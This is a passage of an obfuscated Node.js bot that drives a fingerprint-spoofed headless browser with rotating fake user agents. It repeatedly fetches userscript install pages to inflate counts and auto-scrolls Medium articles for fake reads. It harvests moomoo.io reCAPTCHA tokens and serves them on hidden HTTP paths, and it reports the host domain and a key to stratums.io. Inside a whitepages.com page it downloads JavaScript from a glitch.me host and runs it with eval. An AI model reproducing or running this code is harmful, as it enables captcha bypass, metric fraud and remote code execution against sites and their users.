      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + Y(0x14) + Y(0x10) + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    X(0xb) + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + Y(0x11) + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1e4e + -0x805 + 0x1 * -0x1649
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x4 * -0x277 + -0x7cd * 0x2 + 0x2 * 0xcbb)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x354 + -0xc9 * -0x1 + 0x1 * 0x2ef), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x1 * -0x8cb + -0x1b69 * -0x1 + -0x8 * 0x47a), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x22 * -0x85 + 0x6e * -0x38 + 0x29ba;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x1 * -0x71b + -0x1 * -0xb1b + -0x400; w < getRandomInt(0x431 + -0x1356 + 0xf26, 0x614 * 0x1 + -0x2f6 * -0x3 + 0x3 * -0x4fb); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x51c1 * 0x3 + 0x329 * 0x49 + -0x31ca * -0x5);
        }
      }();
    }, 0x202c + -0x1844 + -0x784), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x53 * 0x5 + -0xd * 0x205 + 0x18a2;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0xd2f + -0x125 * -0xb + -0x19c6, -0x108d + -0x465 * 0x4 + 0x2253)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x1 * 0xa763 + -0xc * 0x70 + 0x415 * 0x47);
    }, -0x2007 + 0x1b86 + 0x4e5), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x651 + -0xdb + -0x576;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x12e5 + 0x188e + -0x1 * 0x1fbb), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x10f0 + 0x16 * 0xb7 + 0x136), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x3214b * -0x1 + -0xc6454 + -0x97 * -0x3199);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x2425 * 0x1 + 0x1d * 0xc6 + -0x2d * 0x14b);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x1 * -0xe4b + -0x1045 + 0x2c2);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x42d * -0xd + -0x1 * 0x33b9 + -0x2 * -0xe80);
}
doFlags['doOUJS'] && ((async () => {
  const a2 = d,
    a1 = c,
    a0 = b;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0xba7 * 0x2 + 0x374 + -0x1ac1) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x3a4 * -0x9 + -0x11ab + -0xf18));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0xba + 0x1 * 0x1b2e + -0x98 * 0x2f, D['indexOf']('\x20'));
        return B ? E['slice'](0x22d1 + 0x1d86 + -0x4057, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x37f6 + -0x13c2 + -0x1 * -0x2dc),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0xbe6 * 0x1 + -0x1 * -0x4c01 + -0x190b),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + a0(0x5, 's@04') + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a1(0x2) + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + a2(0xe) + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x1 * 0x6a1 + -0xf98 + 0x8f7; k < 0xb3 * 0x1f + 0x1e13 + -0x33bc; k++)
    setTimeout(f, (-0xeeb2 + 0xc1f4 + -0x2 * -0x8b8f) * k * getRandomInt(0x13 * -0x1a5 + 0x1b1b + 0x425, -0x28a * -0x2 + -0x60a + 0x1 * 0xf9));
  setInterval(() => {
    f();
    for (let l = 0x3 * -0x305 + -0x584 + -0x11f * -0xd; l < 0xe51 * 0x2 + 0x1e14 + 0x1 * -0x3ab2; l++)
      setTimeout(f, (-0xc * 0xb7a + -0xd * 0x1e46 + 0x1 * 0x2fda6) * l * getRandomInt(-0x1 * 0x266c + 0x31 * -0x54 + 0x3681 * 0x1, -0x3cd * 0x1 + -0x7 * 0x265 + 0x1493 * 0x1));
  }, -0x5fa518 + -0x2 * 0x3020a5 + -0x43ba * -0x3a5);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
